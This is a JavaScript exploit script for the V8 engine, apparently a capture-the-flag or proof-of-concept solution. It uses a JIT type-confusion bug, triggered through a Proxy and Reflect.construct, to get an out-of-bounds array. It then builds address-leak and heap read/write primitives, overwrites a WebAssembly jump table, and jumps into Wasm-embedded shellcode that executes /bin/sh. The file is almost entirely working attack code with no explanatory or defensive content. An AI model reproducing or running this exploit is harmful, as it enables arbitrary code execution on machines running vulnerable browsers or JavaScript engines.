class Helpers {
  constructor() {
    this.cvt_buf = new ArrayBuffer(8);
    this.cvt_f64a = new Float64Array(this.cvt_buf);
    this.cvt_u64a = new BigUint64Array(this.cvt_buf);
    this.cvt_u32a = new Uint32Array(this.cvt_buf);
  }

  ftoi(f) {
    this.cvt_f64a[0] = f;
    return this.cvt_u64a[0];
  }

  itof(i) {
    this.cvt_u64a[0] = i;
    return this.cvt_f64a[0];
  }

  ftoil(f) {
    this.cvt_f64a[0] = f;
    return this.cvt_u32a[0];
  }

  ftoih(f) {
    this.cvt_f64a[0] = f;
    return this.cvt_u32a[1];
  }

  fsetil(f, l) {
    this.cvt_f64a[0] = f;
    this.cvt_u32a[0] = l;
    return this.cvt_f64a[0];
  }

  fsetih(f, h) {
    this.cvt_f64a[0] = f;
    this.cvt_u32a[1] = h;
    return this.cvt_f64a[0];
  }

  isetltof(i, l) {
    this.cvt_u64a[0] = i;
    this.cvt_u32a[0] = l;
    return this.cvt_f64a[0];
  }

  isethtof(i, h) {
    this.cvt_u64a[0] = i;
    this.cvt_u32a[1] = h;
    return this.cvt_f64a[0];
  }

  isetlhtof(l,h){
      this.cvt_u32a[0] = l;
      this.cvt_u32a[1] = h;
      return this.cvt_f64a[0];
  }

  isetltoi(i,l){
    this.cvt_u32a[0] = l;
    return this.cvt_u64a[0];
  }

  isethtoi(i,h){
    this.cvt_u32a[1] = h;
    return this.cvt_u64a[0];
  }

  isetlhtoi(l,h){
      this.cvt_u32a[0] = l;
      this.cvt_u32a[1] = h;
      return this.cvt_u64a[0];
  }

  igetl(i) {
    this.cvt_u64a[0] = i;
    return this.cvt_u32a[0];
  }

  igeth(i) {
    this.cvt_u64a[0] = i;
    return this.cvt_u32a[1];
  }

  gc() {
    for (let i = 0; i < 100; i++) {
      new ArrayBuffer(0x1000000);
    }
  }
  printhex(s, val) {
    //%DebugPrint(s + " 0x" + val.toString(16));
    console.log(s + " 0x" + val.toString(16));
    //document.write(s +' ' + val.toString(16) + " </br>");
    //alert(s + " 0x" + val.toString(16));
  }
};

var helper = new Helpers();

ITERATIONS = 0x10000;

var a = [0.1, , , , , , , , , , , , , , , 0.2, 0.3, 0.4];
var oob_arr = undefined;
var buf = undefined;
var i64arr = undefined;
var fake_imported_mutable_globals_arr = undefined;
var leaker = undefined;

a.pop();
a.pop();
a.pop();

function empty() { }

function f(p) {
  a.push(Reflect.construct(empty, arguments, p)?4.183559239491719e-216:0);
  for (let i = 0; i < ITERATIONS; i++) { }
}

var p = new Proxy(Object, {
  get: () => {
      a[1] = {};
      oob_arr = [0.1];
      buf = new ArrayBuffer(0x100);
      i64arr = new BigUint64Array(buf);
      fake_imported_mutable_globals_arr = [0x1234123412341234];
      leaker = {'x':fake_imported_mutable_globals_arr};
      return Object.prototype;
  }
});

function main(p) {
  f(p);
  for (let i = 0; i < ITERATIONS; i++) { }
}

// optimization
for (let i = 0; i < ITERATIONS; i++) { 
  main(empty);
  a.pop();
}

main(empty);
main(empty);
main(p);
print('[+] Length of oob_arr: 0x' + oob_arr.length.toString(16));

function addrof(obj){
  leaker['x'] = obj;
  return BigInt.asUintN(64,js_base + BigInt(helper.ftoih(oob_arr[0x19])));
}

// i64arr->base_ptr = js_base
oob_arr[0x10] = helper.isethtof(0x10000000n, 0); // length
oob_arr[0x11] = helper.itof(0n); // external_pointer

function caged_read64(addr) {
  /* read 64bits from v8 heap */
  let target = Number(addr) - Number(js_base);
  oob_arr[0x10] = helper.isethtof(0x10000000n, 0); // length
  oob_arr[0x11] = helper.itof(BigInt(target) << 32n); // external_pointer
  return i64arr[0];
}

function caged_write64(addr, val) {
  /* write 64bits to v8 heap */
  let target = Number(addr) - Number(js_base);
  oob_arr[0x10] = helper.isethtof(0x10000000n, 0); // length
  oob_arr[0x11] = helper.itof(BigInt(target) << 32n); // external_pointer
  i64arr[0] = val;
}

// write shellcode to RWX region
var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 8, 2, 96, 0, 1, 124, 96, 0, 0, 3, 3, 2, 0, 1, 7, 16, 2, 4, 109, 97, 105, 110, 0, 0, 5, 100, 117, 109, 109, 121, 0, 1, 10, 169, 1, 2, 161, 1, 0, 68, 144, 184, 47, 98, 105, 110, 235, 7, 68, 144, 144, 144, 137, 4, 36, 235, 7, 68, 144, 184, 47, 115, 104, 0, 235, 7, 68, 144, 144, 137, 68, 36, 4, 235, 7, 68, 144, 144, 144, 72, 137, 231, 235, 7, 68, 144, 144, 144, 144, 49, 246, 235, 7, 68, 144, 144, 144, 144, 144, 86, 235, 7, 68, 144, 144, 144, 144, 106, 8, 235, 12, 68, 144, 144, 144, 144, 144, 94, 235, 12, 68, 144, 144, 144, 72, 1, 230, 235, 12, 68, 144, 144, 144, 144, 144, 86, 235, 12, 68, 144, 144, 144, 72, 137, 230, 235, 12, 68, 144, 144, 144, 144, 49, 210, 235, 12, 68, 144, 144, 144, 72, 49, 192, 235, 12, 68, 144, 184, 59, 0, 0, 0, 235, 12, 68, 144, 144, 144, 144, 15, 5, 235, 12, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 11, 4, 0, 1, 15, 11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var func = wasm_instance.exports.main;
var dummy = wasm_instance.exports.dummy;

function jump(addr) {
  /* jump to addr */
  // overwrite jump table (dummy should not be called before)
  caged_write64(addrof(wasm_instance) + 0x48n - 1n, addr-5n);
  dummy();
}

print('[+] Length of i64arr : 0x' + i64arr.length.toString(16));
var js_base = BigInt.asUintN(64,i64arr[3]) & 0xffff00000000n;
print('[+] js_base : 0x' + js_base.toString(16));

print('[+] wasm_instance : 0x' + (addrof(wasm_instance) - 1n).toString(16));

var rwx = caged_read64(addrof(wasm_instance) + 0x48n -1n);  // address of rwx memory region
print('[+] RWX : 0x' + rwx.toString(16));
Math.cosh(1);

func(); // load instructions
jump(rwx + 0x81an); // jump rop?
